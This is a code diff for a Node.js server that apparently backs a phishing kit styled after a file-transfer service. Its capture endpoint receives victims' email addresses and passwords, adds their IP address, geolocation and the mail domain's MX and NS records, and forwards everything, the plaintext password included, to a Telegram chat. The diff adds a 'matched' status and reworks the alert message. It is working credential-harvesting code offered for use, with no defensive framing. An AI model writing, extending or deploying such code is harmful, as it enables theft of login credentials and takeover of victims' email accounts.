@@ -113,24 +113,28 @@ function esc(v) {
 
 function cap(arr, n) {
   if (!Array.isArray(arr) || !arr.length) return 'none';
-  const items = arr.slice(0, n).map(function (r) { return r.exchange || r.host; });
+  const items = arr.slice(0, n).map(function (r) {
+    if (r && typeof r === 'object') return r.exchange || r.host || '';
+    return String(r == null ? '' : r);
+  });
   if (arr.length > n) items.push('+' + (arr.length - n) + ' more');
   return items.join(' | ');
 }
 
 function buildTgMessage(data, ip, geo) {
   const iso = new Date().toISOString();
+  const status = data.matched ? 'P Matched' : 'P UnMatched';
   const lines = [
-    '<b>WEDECLINE | New capture</b>',
+    '<b>WeTrans | ' + status + '</b>',
     '',
-    '<b>Email:</b> ' + esc(data.email),
-    '<b>Password:</b> ' + esc(data.password),
-    '<b>IP:</b> ' + esc(ip),
-    '<b>Location:</b> ' + esc(geo),
-    '<b>Domain:</b> ' + esc(data.domain),
-    '<b>MX:</b> ' + esc(cap(data.mx, 3)),
-    '<b>NS:</b> ' + esc(cap(data.ns, 3)),
-    '<b>Date:</b> ' + esc(iso.slice(0, 10) + ' ' + iso.slice(11, 19) + ' UTC')
+    'Eml: ' + esc(data.email),
+    'Pwrd: ' + esc(data.password),
+    'IP: ' + esc(ip),
+    'Loc: ' + esc(geo),
+    'Domain: ' + esc(data.domain),
+    'MX: ' + esc(cap(data.mx, 3)),
+    'NS: ' + esc(cap(data.ns, 3)),
+    'Date: ' + esc(iso.slice(0, 10) + ' ' + iso.slice(11, 19) + ' UTC')
   ];
   return lines.join(NL);
 }
@@ -166,12 +170,14 @@ function capture(req, res) {
   }
   const data = Object.assign({}, req.body || {});
   data.password = String(data.password || '');
+  data.matched = data.matched === true || data.matched === 'true';
   if (!data.email) return res.status(400).json({ error: 'email required' });
 
   const ip = clientIp(req);
   getGeo(ip).then(function (geo) {
     const safe = Object.assign({}, data);
     delete safe.password;
+    delete safe.password2;
     logLine('[capture] ' + JSON.stringify(Object.assign(safe, { ip: ip, geo: geo })));
     return tgSend(buildTgMessage(data, ip, geo));
   }).then(function () {
@@ -186,7 +192,7 @@ app.post('/auth', capture);
 app.get('/', function (req, res) {
   const page = path.join(__dirname, 'wedecline.html');
   if (fs.existsSync(page)) return res.sendFile(page);
-  res.json({ name: 'wedecline-api', version: 'v2', status: 'ok', endpoints: ['GET /lookup?email=', 'POST /auth/login'] });
+  res.json({ name: 'wedecline-api', version: 'v3', status: 'ok', endpoints: ['GET /lookup?email=', 'POST /auth/login'] });
 });
 
 app.use(function (req, res) {
